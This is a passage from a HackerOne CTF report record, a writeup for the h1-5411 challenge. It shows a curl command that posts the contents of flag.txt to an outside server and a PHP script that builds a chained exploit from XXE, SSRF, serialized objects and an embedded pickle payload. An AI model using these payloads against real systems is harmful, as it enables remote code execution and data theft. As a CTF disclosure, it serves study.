4.0K Sep 18 17:50 templates\n```\n\nUsing this method to look at flag.txt (\u201cpython pickle.py 'curl -X POST -d \"|$(cat flag.txt)|\" myserver.com\u201d) shows the flag:\n\n```\nYay! Here is your flag:\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\n\nGo to https://hackerone.com/h1-5411-ctf and submit your writeup!\n```\n\nPHP code used to generate payload (this works on http://sandbox.onlinephpfunctions.com/):\n\n```\n<?php\n\n$qqq= array(\"test\", \"abc\");\n\nclass ConfigFile {\n    function __construct($url) {\n      $this->config_raw = $url;//file_get_contents($url);\n    }\n    function parse() {\n        echo '<p>DEBUG: parse() hit (current config_raw = '.htmlspecialchars($this->config_raw).' )</p>';\n      $dom = new DOMDocument();\n      $dom->loadXML($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this->top_text = $o->toptext;\n      $this->bottom_text = $o->bottomtext;\n      $this->template = $o->template;\n      $this->type = $o->type;\n    }\n\n    function generate() {\n      $this->parse();\n      $meme_path = \"https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder\";\n      if ($this->type == IMAGE) {\n        if (@is_array(getimagesize($this->path))) {\n          $meme_path = MEMES_FOLDER . $filename . \".jpg\";\n          $args = array(\n            \"top_text\"    => $top_text,\n            \"bottom_text\" => $bottom_text,\n            \"filename\"    => $meme_path,\n            \"font\"        => FONT_BASE,\n            \"memebase\"    => $this->path,\n            \"textsize\"    => 40,\n            \"textfit\"     => true,\n            \"padding\"     => 10,\n          );\n          memegen_build_image($args);\n        }\n      }\n      if ($this->type == TEXT) {\n        if (!@is_array(getimagesize($this->path))) {\n          $contents = file_get_contents($this->path);\n          $meme = \"  \" . strtoupper($top_text) . \"\\n\\n\" . $contents . \"\\n  \" . strtoupper($bottom_text);\n          $meme_path = MEMES_FOLDER . $filename . \".txt\";\n          file_put_contents($meme_path, $meme);\n        }\n      }\n      return $meme_path;\n    }\n    function __toString() {\n        echo '<p>DEBUG: toString() hit</p>';\n      $this->parse();\n      $debug = \"\";\n      $debug .= \"Debug Info :\\n\";\n      $debug .= \"TopText => {$this->top_text}\\n\";\n      $debug .= \"BottomText => {$this->bottom_text}\\n\";\n      $debug .= \"Template Location => {$this->template}\\n\";\n      $debug .= \"Template Type => {$this->type}\\n\";\n      return $debug;\n    }\n}\n\n$test = new ConfigFile(\"asdf\");\n\n$test->config_raw = '<?xml version=\"1.0\"?>\n<!DOCTYPE root\n[\n<!ENTITY foo SYSTEM \"php://filter/convert.base64-encode/resource=http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==&debug=1\">\n]><test><toptext> &foo;</toptext></test>';\n\n$serialized = base64_encode(serialize(array($test)));\n\n// test to make sure array_merge still works\n$new_memes = unserialize(base64_decode($serialized));\n$qqq = array_merge($qqq, $new_memes);\n\n// print it\necho $serialized;\n\n?>\n\n```\n\n## Impact\n\nContent injection", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://tbd.com", 
            "about": null, 
            "twitter_handle": null, 
            "name": "h1-5411-CTF"
        }, 
        "handle": "h1-5411-ctf", 
        "url": "https://hackerone.com/h1-5411-ctf", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/314/1a0c110b0060c574d84b531160a0d2c58141ce6e_small.?1537539140", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/033/314/78d6c799326d92d4cad56dc8c1899a7ea55bc7f2_medium.?1537539140"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 33314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}